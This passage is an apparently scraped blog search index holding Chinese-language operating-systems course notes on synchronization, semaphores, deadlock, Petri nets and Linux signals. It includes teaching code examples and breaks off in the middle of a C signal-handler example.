笔记/GBS/GBS-2-Prozess-und-Prozessorverwaltung-进程与处理器管理/","permalink":"https://archer-baiyi.github.io/en/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-2-Prozess-und-Prozessorverwaltung-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%84%E7%90%86%E5%99%A8%E7%AE%A1%E7%90%86/","excerpt":"操作系统基础相关笔记","text":"进程（Prozess）进程管理（Prozessverwaltung）Dispathcer调度（Scheduling）调度策略（Scheduling-Strategien）First-Come-First-Served (FCFS) Shorttest Job First (SJF) Shortest Remaining Time Next (SRTN) Round-Robing Scheduling (RR) Proority Scheduling Earliest Deadline First (EDF) 线程（Threads）","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/en/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/en/tags/Operating-System/"},{"name":"进程","slug":"进程","permalink":"https://archer-baiyi.github.io/en/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"线程","slug":"线程","permalink":"https://archer-baiyi.github.io/en/tags/%E7%BA%BF%E7%A8%8B/"}]},{"title":"GBS 3 Parallele Systeme und Synchronisation 并行系统与同步","slug":"TUM info 笔记/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-并行系统与同步","date":"2025-04-03T21:20:44.000Z","updated":"2025-04-26T18:30:50.840Z","comments":true,"path":"2025/04/03/TUM info 笔记/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-并行系统与同步/","permalink":"https://archer-baiyi.github.io/en/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-%E5%B9%B6%E8%A1%8C%E7%B3%BB%E7%BB%9F%E4%B8%8E%E5%90%8C%E6%AD%A5/","excerpt":"操作系统基础相关笔记","text":"Einführung因为（单核）系统无法做到真正的并行进程，所以所谓的parallel的活动会导致不确定性（Nichtdeterminismus），即系统在相同的初始条件和相同的输入下表现出不同的行为。 例子： 假设现在我们有一个变量 $x = 2$，以及2个进程： 进程1：$x = x + 5$ 进程2：$x = x \\cdot 2$ 那么如果先运行进程1再运行2就会得到 $x = 14$，先运行进程2再运行1就会得到 $x = 9$ 。 介绍几个概念： 竞态条件（Race Condition）：至少两个进程在读取或写入共享资源。这个时候最终结果会依赖于进程执行的顺序。 临界区（Kritischer Abschnitt，critical section/region）：进程会在临界区中访问共享资源，而对于只能被独占使用的资源，访问将被顺序化/串行化（sequentialisiert）。 所有跟共享资源相关的操作都会在临界区里执行。 互斥（Wechselseitiger Ausschluss，Mutual Exclusion）：确保同一时间只有一个进程/线程能访问临界资源（critical section）。 互斥的实现一共需要注意以下几点： 临界区必须是互斥访问的（wechselseitig ausgeschlossen），即同一时间只有一个进程可以进入临界区（kritischer Abschnitt） 互斥的实现不得依赖于进程执行临界区的顺序假设。 互斥的实现不得依赖于进程执行时间的假设。 不能让某个进程无限期地阻止另一个进程进入临界区，即避免Starvation。 图解： 在以下几个层面都有对应的办法来实现互斥/同步： 硬件层面 通过禁止中断（Interrupts sperren）实现互斥（如中断屏蔽） 使用原子机器指令（如 TSL、cmpxchg）保障操作不可分割（atomic） 简单的系统层面 主动等待（如：Spin-Lock，busy waiting） 被动等待（如：sleep/wakeup，节省 CPU） 更高级的操作系统层面 信号量（Semaphore）：支持主动或被动等待 互斥锁（Mutex） 编程语言层面 监视器（Monitor）概念：语言层级的同步抽象 硬件层面中断屏蔽（Unterbrechnungssperre）中断（Interrupt, Unterbrechung ）是通过专用的中断线路发出的信号，例如： I/O 设备发出信号表示任务已完成 定时器发出信号表示时间片已用尽 而中断会打断当前的活动进程，将其转为就绪/等待状态（rechenwillig/wartend），然后Interrupt Handler会来处理这个中断。 所以我们可以通过屏蔽中断来实现互斥访问：让 CPU 暂时禁止处理中断（temporarily prevent the CPU from responding to interrupts），防止当前进程在执行期间被强制让出 CPU，这样一来进程就可以不被打扰地完成其临界区操作。 只不过这个方法（中断屏蔽）只适用于单处理器系统来实现临界区，因为在多处理器系统中，即使一个 CPU 禁用了中断，其他 CPU 仍然可以访问共享资源。 并且实施时需要注意几点： 确保由中断屏蔽保护的临界区必须很短。 因为所有中断都是有意义的，随便屏蔽的话系统容易出问题。 该机制最多只应在操作系统内核中使用。 为了安全性考虑。 原子性机器指令（Atomare Maschinenbefehle）大多数计算机架构都具备专门用于原子操作的机器指令，我们这里以其中的 TSL（Test-and-Set Lock）为例子。 具体实现的话需要先定义2个函数：enter_crit_region和leave_crit_region 。（见下方代码） 具体流程： 通过共享变量 lock 对内存访问进行同步 在进入临界区之前，进程 P 会调用 enter_crit_region 如果 lock == 0，则进程 P 可以执行其临界区代码 否则，进程必须主动等待（忙等，busy waiting），直到 lock 被重置为 0 临界区结束后，进程 P 必须重置共享变量 lock，调用 leave_crit_region enter_crit_region： 12345enter_crit_region: tsl rax, [lock] ; 将 lock 的值读入 rax，并将 lock 设置为 1（原子操作） cmp rax, $0 ; 判断原值是否为 0（锁是否空闲） jne enter_crit_region ; Busy Waiting（一直等） ret ; 如果是 0，表示可以进入临界区 leave_crit_region： 123leave_crit_region: mov [lock], $0 ; 将 lock 重置为 0，释放锁 ret 简单的系统层面主动等待（Aktives Warten）刚才提到的同步概念被叫做自旋锁（Spin-Lock）：进程会在一个循环中不断检查资源是否仍然被占用，也就是所谓的主动等待（Aktives Warten）。 但是一直在这里等的话效率非常低下。 示例： 123456/* busy waiting emulation */int main () &#123; while (shouldWait) &#123; // 什么都不做，只是一直干等 &#125;&#125; Passives Warten（被动等待）相比之下 Passives Warten（被动等待） 就要高效很多：会使用系统服务（比如说 sleep）让进程进入等待状态（wartend），或者使用系统服务（比如说 wakeup ）让进程进入可运行状态（echenbereit）。 比如说2个进程传输数据，A传给B。A传的时候让B进入等待状态，等A传完了再把B叫起来让它处理数据。 例子：生产者消费者问题（Erzeuger-Verbraucher-Problem）在这个例子中我们会有2个并行的进程：一个生产者（Erzeuger，producer）和一个消费者（Verbraucher，consumer）。两者共用一个缓存区（Puffer，Buffer）。对缓冲区的访问必须实现互斥。 先给一个反例，后续会慢慢看到如何正确解决这个问题： 123456789101112void producer(void) &#123; int item = 0; while (true) &#123; item = produce_item(); if (count == N) sleep(); insert_item(item); count = count + 1; // 注意这里 if (count == 1) wakeup(consumer); &#125;&#125; 123456789101112void consumer(void) &#123; int item = 0; while (true) &#123; if (count == 0) sleep(); item = remove_item(); count = count - 1; // 注意这里 if (count == N - 1) wakeup(producer); consume_item(item); &#125;&#125; 可以看到这里希望通过 count 来实现互斥，但问题是 count 本身就是一个共享变量。 更高级的操作系统层面信号量（Semaphore）定义： 信号量（Semaphore）是一个整数控制变量 s 在这个变量上定义了三种操作： 初始化（Initialisierung） P（down、wait） V（up、signal） 控制变量的值表示：允许多少个进程同时进入临界区 （P和V代表的是Proberen 和 Verhogen，是荷兰语，因为提出信号量这个概念的是Dijkstra，他是荷兰人。） 那么这两个操作具体是怎么定义的呢： down 操作（P）： 控制变量 s 会被减一 如果 s &lt; 0，当前进程 必须等待 而在使用被动等待的实现中： 进程会被转为“等待状态”，并被加入等待队列（Wait-Queue）中管理 up 操作（V ）： 控制变量 s 会被加一 如果使用的是被动等待： 如果等待队列不为空，则唤醒其中一个进程（变为就绪状态，rechenbereit ） 代码示例： 1234567void down(semaphore *wa) &#123; int* s = &amp;wa-&gt;s; // 访问wa这个结构体中s的值，简单来讲就是访问当前s的值。 *s -= 1; if (*s &lt; 0) &#123; thread_yield(wa-&gt;wait_queue); // 把当前线程挂起，放入等待队列 &#125;&#125; 1234567void up(semaphore *wa) &#123; int* s = &amp;wa-&gt;s; // 访问wa这个结构体中s的值，简单来讲就是访问当前s的值。 *s += 1; if (*s &lt;= 0) &#123; thread_wakeup(wa-&gt;wait_queue); // 从等待队列中唤醒一个线程 &#125;&#125; 那么我们该怎么使用这个信号量呢？ 首先定义一个信号量对象 wa 将控制变量 s 初始化为 1（或更大的 n） 取决于我们希望有多少个进程同时进入临界区 用 P/V 操作包裹临界区代码： 123down(&amp;wa); // P操作：尝试进入execute_crit_region(); // 临界区操作up(&amp;wa); // V操作：释放信号量 ok，我们现在拥有更高级的工具了，再回来看一下刚才没有完全解决的生产者-消费者-问题。 还是先看一个反例： 只使用一个信号量 wa 来控制对缓冲区的访问，初始化为1。 1234567/* Producer */while (true) &#123; element = produce(); // 生产一个元素 down(&amp;wa); // 请求进入临界区 write_to_buf(W, element); // 写入缓冲区 up(&amp;wa); // 释放临界区&#125; 1234567/* Consumer */while (true) &#123; down(&amp;wa); // 请求进入临界区 element = read_from_buf(W); // 从缓冲区读取元素 up(&amp;wa); // 释放临界区 consume(element); // 消费数据&#125; 问题出在没有能够反应当前缓冲区是否满或者是空的状态。 假如Producer进入了满的缓冲区，那么它无法进行写入操作，也就无法进行后续的 up(&amp;wa) 。它会卡在这里，并且Consumer也无法进来读取数据。 那么该如何正确地解决这个问题呢： 我们需要在此基础上添加2个信号量： 一个用于表示当前的缓冲区已满：voll，初始化为0 一个用于表示当前的缓冲区剩余的位置：leer，初始化为n，n 是缓冲区大小。 123456789/* Producer */while (true) &#123; element = produce(); // 生产数据 down(&amp;leer); // 等待有空位 down(&amp;wa); // 请求进入缓冲区（互斥） write_to_buf(W, element); // 写入缓冲区 up(&amp;wa); // 释放互斥锁 up(&amp;voll); // 增加“已满”计数&#125; 123456789/* Consumer */while (true) &#123; down(&amp;voll); // 等待有数据可读 down(&amp;wa); // 请求进入缓冲区（互斥） element = read_from_buf(W); // 读取数据 up(&amp;wa); // 释放互斥锁 up(&amp;leer); // 增加“空位”计数 consume(element); // 消费数据&#125; 互斥锁（Mutex）Mutex类似于二进制信号量（binary semaphore），只有2个状态：unlocked 和 locked。 注意：可以将Mutex当成2元信号量来理解，但是要清楚他们严格来讲并不一样。最大的区别便是拥有权： 互斥锁（Mutex）只能由获取锁的实体（Entity）进行解锁（也就是说，它有一个Owner）。 信号量（Semaphore）没有 Owner 的概念。 编程语言层面监视器（Monitore）属于比信号量（Semaphore）更高级的抽象层级。 监视器将数据和对数据的访问操作封装在一起，实现自动同步，编译器则负责生成底层的信号量及其使用代码。 简单来讲就是监视器（Monitore）会把互斥访问这一部分封装成一个黑盒（Black Box），使用时只需调用接口，不需要关心底层是怎么加锁、解锁的。这样一来也更不容易出错。 一般使用定义好的操作 Produce 和 Consume 来调用监视器（Monitore）。 例子：Speisende Philosophen（Dining Philosophers）死锁（Deadlock）死锁（Deadlock）描述的是一组进程里每个进程都在等待一个事件发生，但这个事件只能由其他等待中的进程触发。 比如说A和B去图书馆借书，A已经借了x，B已经借了y。但现在A想借y，B想借x。只不过双方都希望借到新书了之后再把手上现有的这本还回去。这样就会陷入僵局，也就是死锁。 例子： 1234567void process_A(void) &#123; down(&amp;sema_resource_1); // 请求资源 R1 down(&amp;sema_resource_2); // 请求资源 R2 use_both_resources(); // 使用两个资源 up(&amp;sema_resource_2); // 释放 R2 up(&amp;sema_resource_1); // 释放 R1&#125; 1234567void process_B(void) &#123; down(&amp;sema_resource_2); // 请求资源 R2 down(&amp;sema_resource_1); // 请求资源 R1 use_both_resources(); // 使用两个资源 up(&amp;sema_resource_1); // 释放 R1 up(&amp;sema_resource_2); // 释放 R2&#125; 出现死锁（Deadlock）的充要条件（Notwendige und hinreichende Bedingungen）： 互斥使用资源（Exklusiv nutzbare Ressource，Mutual Exclusion） 共享资源不可同时被多个进程访问。 占有且等待（Belegen und Anfordern，Hold and Wait） 进程已经持有资源，还要继续请求其他资源。 不可抢占（Nicht Entziehbar，No Preemption） 资源不能被强行拿走（被系统抢回），只能自己释放。 循环等待（Zyklische Wartebedingung，Circular Wait） 至少两个或更多进程形成一个循环，每个进程都在等待另一个进程所持有的资源。 （死锁是等价于这4个条件同时满足的。） 建模有向图 Belegungsanforderungsgraphen： 点 圆圈表示进程， 方形表示资源 边 进程A占用（belegt）资源R：R到A的边 进程A想要（fordert）资源R：A到R的边 例子： Deadlocks的应对策略主要有4种策略： 忽视（Ignorieren） 检测（Deadlock-Detection ，Erkennung） 分配资源后检测/模拟是否会产生死锁，如果会的话就回档。 避免（Deadlock-Avoidance，Vermeidung） 分配资源前模拟是否会产生死锁 使用 Bankier-Algorithmus 预防（Deadlock-Prevention，Verhinderung） 设计的时候就避免死锁出现，确保上面的4个条件至少有一条不会出现。 对比： 策略类型 方法 优点 缺点 识别（Erkennung） 周期性检测（Periodischer Aufruf） 可交互式响应（Interaktive Reaktion） 可能通过中止造成损失（Verlust durch Abbruch） 避免（Vermeidung） 银行家算法（Bankiers-Algorithmus） 无需资源抢占（Kein Ressourcenzug） 需要提前知道未来资源需求（Zukünftiger Bedarf muss bekannt sein） 预防（Verhinderung） 资源分配采用固定顺序（Feste Reihenfolge bei Zuteilung） 无需运行时检查（Keine Laufzeitprüfungen） 静态、不灵活（Statisch, inflexibel） 一次性分配所有资源（Alle Ressourcen auf einmal zuteilen） 不需要资源抢占（Kein Ressourcenzug notwendig） 效率低（Ineffizient） 例题例题1假设现在有2个线程并行运行，并且共享内存（Shared Memory）中的x和y被初始化为0： 1234// Thread 1if (y &gt;= 0)&#123; x = x+1; //atomic&#125; 1234// Thread 2while (x &lt;= 0 &amp;&amp; y &gt; -3)&#123; y = y-1; //atomic&#125; 问题1：给出所以可能的结果组合。（Was sind alle möglichen Kombinationen der Werte für x und y nach der nicht-deterministsichen Ausführung der obenstehenden Threadds?） 首先假设一开始先只运行Thread 2，等结束了之后在运行Thread 1，这时 $y=-3$，已经不满足Thread 1里的 if 条件了，所以结果为 $(x,y)=(0,-3)$ 。 假设先只运行Thread 1，等完全结束了之后再运行Thread 2，这时 $x=1$ ，已经不满足Thread 2里的 while 条件了，所以结果为 $(x,y)=(1,0)$ 。 假设Thread 1，2先读取了 $x,y=0$ ，然后各自运行了一次，这时 $(x,y)=(1,-1)$ ，都不满足判断条件了，所以2个都结束，结果为 $(x,y)=(1,-1)$。 假设Thread 1，2先读取了 $x,y=0$ ，然后 Thread 2 先运行了2次 （这时 $y=-2$），然后 Thread 1 运行了1次，那么结果为 $(x,y)=(1,-2)$ 。 假设Thread 1，2先读取了 $x,y=0$ ，然后 Thread 2 先运行了3次 （这时 $y=-3$），然后 Thread 1 运行了1次，那么结果为 $(x,y)=(1,-3)$ 。 所以答案为： x y 0 -3 1 0 1 -1 1 -2 1 -3 问题2：现在该怎么利用Semaphoren和Mutex（限量3个及以内）使得最终结果为 $x=1, y=-1$？ 回顾一下上面的逻辑，想要得到这个结果需要让 Thread 1，2先读取 $x,y=0$ ，然后各自运行一次。 我们这里需要利用Mutex设置2道坎： 在做 if 或者 while 判断前设置一道 在 Thread 2 的while循环内的结尾设置一个 这样一来可以确保双方都先读取 $x,y=0$ ，然后运行一次 Thread 2之后运行 Thread 1。最终得到 $x=1, y=-1$ 。 答案： Innitialisierungsblock 12block_t1(0)block_t2(0) Codeblock 12345678910// Thread 1if (y &gt;= 0)&#123; up(block_t2); // 先等Thread 1 通过的if的判断再放行 Thread 2 down(block_t1); x = x + 1; up(block_t2);&#125; 123456789// Thread 2down(block_t2;)while (x &lt;= 0 &amp;&amp; y &gt; -3)&#123; y = y-1; up(block_t1); down(block_t2); // 先等 Thread 2 运行了一次之后再运行 Thread 1&#125; 先让t1通过if判断，然后blockieren。这时t2通过wihle判断并进行一轮操作，接着再进行t1的操作。t1操作完再通知t2可以进行后续操作（即进行第二次的while的判断）。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/en/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/en/tags/Operating-System/"},{"name":"Mutex","slug":"Mutex","permalink":"https://archer-baiyi.github.io/en/tags/Mutex/"},{"name":"Semaphore","slug":"Semaphore","permalink":"https://archer-baiyi.github.io/en/tags/Semaphore/"}]},{"title":"GBS 4 Modellierung Paralleler Systeme 并行系统建模","slug":"TUM info 笔记/GBS/GBS-4-Modellierung-Paralleler-Systeme-并行系统建模","date":"2025-04-03T21:20:18.000Z","updated":"2025-04-26T18:30:55.451Z","comments":true,"path":"2025/04/03/TUM info 笔记/GBS/GBS-4-Modellierung-Paralleler-Systeme-并行系统建模/","permalink":"https://archer-baiyi.github.io/en/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-4-Modellierung-Paralleler-Systeme-%E5%B9%B6%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%BB%BA%E6%A8%A1/","excerpt":"操作系统基础相关笔记","text":"Parallele Systeme并行系统（Parallele Systeme）的一些特性（Eigenschaften）： 确定性（Determiniertheit）： 在相同条件下，产生相同的结果。 无干扰性（Störungsfreiheit）： 在遵守既定的并行事件执行顺序的前提下，结果不受影响。 互斥访问资源（Wechselseitiger Ausschluss exklusiv nutzbarerer Ressourcen，mutual exclusion）： 每一时刻最多只有一个进程可以访问共享资源（该资源被独占使用）。 无死锁（Verklemmungsfreiheit，Deadlock free）： 没有多个进程间的循环等待情况。 无饥饿（Kein Verhungern，Starvation free）： 不会有进程因为被一直推迟执行而永远得不到资源。 我们这里主要关注一个用于形式建模的方法：Petri-Netze。 Petri-NetzePetri-Netze主要是关注状态以及状态变化（Zuständen und Zustandsüberg.ngen）。 首先先来看定义： 一个 Petri 网是一个三元组 (S, T, F)，其中： S：有限集合，称为“Stellen”（位置 / 状态） 用圆圈表示。 表示被动元素，例如：存储单元、资源。 T：有限集合，称为“Transitionen”（变迁 / 转换） 用矩形表示。 表示主动元素，例如：处理器、事件、过程。 F：流关系（Flussrelation） $F \\subseteq (S \\times T) \\cup (T \\times S)$ 用有向边（gerichtete Kanten）表示。 并且满足：$S \\cap T = \\emptyset$ 。 每个Knote $x \\in (S \\cup T)$的 Vorbedingung 指的是：$\\bullet x := \\{ \\ y \\ | \\ y \\ F \\ x\\ \\}$，即能到x的点 Nachbedingung 指的是：$ x \\bullet := \\{ \\ y \\ | \\ x \\ F \\ y\\ \\}$，即x能到的点。 例子： 和其他的建图一样，我们这里也可以定义带有标记（即容量，权重等）的图： Kapazität einer Stelle：$c : S \\to \\mathbb{N}_0 \\cup \\{\\infty\\}$ 如果没有专门标记出来，则默认 $\\infty$。 Gewichtung einer Kante：$w : F \\to \\mathbb{N}_0$ 如果没有专门标记出来，则默认 $1$。 一个位置-变迁网（Stellen-Transitionsnetz）里除了上面提到的2个函数还需要一个函数 $M : S \\to \\mathbb{N}_0 \\cup \\{\\infty\\}$ 用于描述图当前的状态（Aktuelle Belegung des Netzes），即每个Stelle里的Token数量。 需要满足 $\\forall s \\in S: M(s) \\leq c(s)$。 一个位置-变迁网（Stellen-Transitionsnetz）叫做Bedingungs/Ereignisnetz 或 Boolesches Netz（布尔网络），当$M : S \\to \\mathbb{B}$ ，也就是说每个Stelle里最多可以有1个Token。 触发规则（Schaltregel）一开始我们就提到，我们的关注点主要是系统的状态以及状态的变化。在前面介绍的内容中，函数 $M$ 被用来描述系统的当前状态，而我们希望通过 $T$（即Transitionen的集合）来描述状态的变化过程。不过，任何状态的变化都必须满足一定的前提条件。那么接下来我们就来看看，在 Petri 网中，这些条件是如何被定义的。 给定一个位置-变迁网（Stellen-Transitionsnetz），即一个Petri-Netz (S, T, F)，函数 $c, w, M$。 一个Transition $t \\in T$ 可以触发（kann schalten）当： $\\forall s \\in \\bullet t: M(s) \\geq w(s, t) $ $\\forall s \\in t\\bullet: M(s) \\leq c(s) - w(t, s)$ 即当： 到 t 的Stelle里有足够的Token（至少 $w(s, t)$ 个） t 能到的所有Stelle里有足够的空位给 $w(t, s)$ 个Token 时才能触发 t 。 这个t触发后整个图的状态会变成$M’$： $\\forall s \\in \\bullet t \\setminus t\\bullet: M’(s) = M(s) - w(s, t)$ $\\forall s’ \\in t\\bullet \\setminus \\bullet t: M’(s’) = M(s’) + w(t, s’)$ $\\forall s’’ \\in \\bullet t \\cap t\\bullet: M’(s’’) = M(s’’) - w(s’’, t) + w(t, s’’)$ 例子： 因为没有专门标记出来，所以默认Kapazität是 $\\infty$，Gewicht是1。 不能Schalten的例子： 因为后面那里已经没有空余的位置了。 这个同样不行，因为这里Schalten需要考虑3个地方： 左边的s是否有足够的（1个）Token来触发t 左边的s是否有足够的空闲位置 右边的s是否有足够的空闲位置 很明显第二点并不满足。 注意，这里不能想着说反正左边的token会在触发 t 的时候被消耗掉所以就有足够的空闲位置！！！ 一定要所有的前提条件都满足了才能触发 t 。 接下来我们来看一下怎么样可以通过建模出来的图判断当前系统的一些属性： 并发性 / 并行性（Nebenläufigkeit，Concurrency）两个Transitionnen $t_0$ 和 $t_1$ 是并发的（nebenläufig），当它们可以互不干扰地独立触发（unabhängig von einander schalten können, ohne sich gegenseitig zu beeinflussen.）。 例子： 可以看到，这里的 $t_1$ 和 $t_2$ 是并发的（nebenläufig），但 $t_1, t_2$ 和 $t_3$ 明显不是，因为 $t_3$ 只有在 $t_1, t_2$ 被触发后才能被触发。 不确定性（Nichtdeterminismus）不确定性表示在给定的标记状态 $M$ 下，可能会出现关于Transitionen可触发性的冲突。 而 $t_0$ 和 $t_1$ 处于冲突中（stehen im Konflikt），当它们共享输入或输出的位置，并且这些位置的 token 数量只能满足其中一个Transition的触发条件。 如果token的数量足够触发所有的Transitionen那就不算有冲突，整个图也是确定的（deterministisch）。 这样会导致进行一次不确定的选择（nichtdeterministische Auswahl）。 例子： 这里的 $t_1$ 和 $t_3$ 冲突了，因为s1里只有1个token，所以要么触发 $t_1$ ，要么触发 $t_3$。 可到达性（Erreichbarkeit）给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 那么一个有限序列（endliche Sequenz）$\\rho = t_0, t_1,…, t_n \\ (\\text{with } t_i \\in T)$ 被叫做由 $M_0$ 激活的有限切换序列（von M aktivierteendliche Schaltfolge），当存在 $M_1, M_2,… M_n$ 使得： M_0 \\xrightarrow{t_0} M_1 \\xrightarrow{t_1} \\dots \\xrightarrow{t_n} M_n, \\text{ 即 } M_0 \\xrightarrow{\\rho} M_n如果存在一个有限序列使得 $M$ 能变成 $M’$ ，那么我们就说 $M’$ ist von $M$ erreichbar。 针对这个Erreichbarkeit我们可以再建立个图，叫做 Erreichbarkeitsgraph。里面的点表示 Belegung，有向边表示 Transition。 例子： 它对应的Erreichbarkeitsgraph： 记得左上角的这个有向边一定要画！ 注意：每个Petri-Netz会有着唯一的一个Erreichbarkeitsgraph，但一个Erreichbarkeitsgraph可能会对应很多个Petri-Netz，因为可能存在一些永远无法触发的Transitionen（这些无法触发的Transitionen完全不会改变Erreichbarkeitsgraph）。 Lebendigkeit（liveness）给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 它是活跃的（lebendig），当对于所有 $t \\in T$ 都满足以下条件： 对于所有从 $M_0$ 可到达的状态 $M_1$，存在一个后续状态 $M_2$， 使得 $t$ 在 $M_2$ 中可以触发，且 $M_2$ 是从 $M_1$ 可达的，即 \\forall M_1 \\text{ with } M_0 \\xrightarrow{\\rho_1} M_1: \\quad \\exists \\rho_2, M_2 \\text{ s.t. } M_1 \\xrightarrow{\\rho_2} M_2 \\xrightarrow{t}死锁（Verklemmung, Deadlock）给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 从 $M_0$ 出发可达的某个标记 $M$，称为完全死锁状态（vollständige Verklemmung），如果在该状态下没有任何Transition $t \\in T$ 可以触发。 如果一个Netz是lebendig的，那么它一定是verklemmungsfrei。（lebendig $\\Rightarrow$ verklemmungsfrei） 但一个Netz是verklemmungsfrei不一定能够说明它也是lebendig的。（verklemmungsfrei $\\nRightarrow$ lebendig ） Verhungern（Starvation），Fariness给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 Eine Transaktion t ∈ T verhungert, 当存在一个无线序列使得t尽管处于可触发的状态但是只被触发了有限次。（wenn es eine unendliche Sequenz gibt, in der t trotz Transitionsbereitschaft nur endlich oft auftritt.） 注意这里的前提条件“处于可触发的状态”非常重要，这个如果不满足那么就不能叫verhungert。 一个Netz是公平的（fair）的，当不存在某个无限序列（例如 $t_0 \\to t_4 \\to t_1 \\to \\dots$），使得变迁 $t$ 虽然始终处于可触发状态，却永远没有或只有有限次被实际触发。 所以如果一个Netz是公平的，那么就没有Transition会挨饿（verhungert）。 例子： 这个Netz是不公平的（unfair），因为存在 $t_0 \\to t_0 \\to t_0 \\to \\dots$ ，即 $t_1$ 会挨饿； $t_1 \\to t_1 \\to t_1 \\to \\dots$ ，即 $t_0$ 会挨饿； 例子： 这个图是： nicht lebendig 因为t0只能被触发一次。 deadlockfrei 进到右边那个圈里之后永远都可以有后续操作。 fair 因为t0触发一次之后不可能再进入准备就绪的状态，所以不算挨饿。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/en/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/en/tags/Operating-System/"},{"name":"Petri-Netz","slug":"Petri-Netz","permalink":"https://archer-baiyi.github.io/en/tags/Petri-Netz/"}]},{"title":"GBS 5 Inter-Prozesskommunikation (IPC) 进程间通信","slug":"TUM info 笔记/GBS/GBS-5-Inter-Prozesskommunikation-IPC-进程间通信","date":"2025-04-03T21:19:45.000Z","updated":"2025-04-26T18:31:01.019Z","comments":true,"path":"2025/04/03/TUM info 笔记/GBS/GBS-5-Inter-Prozesskommunikation-IPC-进程间通信/","permalink":"https://archer-baiyi.github.io/en/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-5-Inter-Prozesskommunikation-IPC-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/","excerpt":"操作系统基础相关笔记","text":"[toc] 无连接通信（Verbindungslose Kommunikation）无连接通信（Verbindungslose Kommunikation）的通道（Kanäle）可以按照带宽（Bandbreite）分成2种： 窄带通道（Schmalbandige Kanäle） 宽带通道（Breitbandige Kanäle） 窄带通道（Schmalbandige Kanäle）窄带通道（Schmalbandige Kanäle）只传输少量信息（wenige Bits），主要用于事件的通知（Melden von Ereignissen）。它需要同步机制和中断机制（Synchronisationskonzepte und Unterbrechungskonzepte ）来确保通信的可靠性。 Linux里的例子：Signals 进程可以互相发送信号（使用 kill() ） 进程可以显式捕获这些信号（使用 signal() ）： 可以通过注册一个信号处理函数（signal handler）来处理信号 也忽略该信号（使用 SIG_IGN） 如果一个进程没有捕获（abfangen）信号，那么操作系统会终止（beendet）该进程。 SIGKILL 和 SIGSTOP 是不能被捕获的，这些信号会强制终止或暂停进程，进程无法阻止或忽略它们 kill()函数的用法： kill(pid, signal)，其中pid是进程ID，signal是具体要发送的信号，可选的有： 信号名 作用说明 SIGHUP 终端挂起或控制进程终止，常用于重新加载配置 SIGINT 中断（通常来自 Ctrl+C） SIGILL 非法指令，通常是程序错误导致 SIGABRT 异常终止（由 abort() 触发） SIGKILL 强制终止，无法被捕获或忽略 SIGUSR1 用户自定义信号 1 SIGSEGV 段错误（Segmentation Fault） SIGUSR2 用户自定义信号 2 SIGPIPE 管道破裂（写入没有读取端的 pipe） SIGALRM 定时器信号（alarm() 到期触发） SIGTERM 正常终止请求，默认的 kill 信号 SIGCHLD 子进程结束时通知父进程 SIGCONT 恢复被停止的进程 SIGSTOP 强制停止，无法被捕获或忽略 SIGTSTP 终端停止信号（Ctrl+Z） 代码示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;// 信号处理函数：当接收到信号时执行void sighandler(int sig) &#123; printf(&quot;Caught signal %d\\n&quot;, sig); // 重新注册信号处理器（旧版 signal API 需要这样做） signal(SIGINT, sighandler); // Ctrl+C signal(SIGALRM, sighandler); // alarm() 触发的定时器信号&#125;int main(int argc, char *argv[], char *envp[]) &#123; char buffer[1024]; // 用于存储用户输入 int len; // 注册信号处理函数 signal(SIGINT, sighandler); // 捕获 Ctrl+C signal(SIGALRM, sighandler); // 捕获定时器 alarm 信号 // 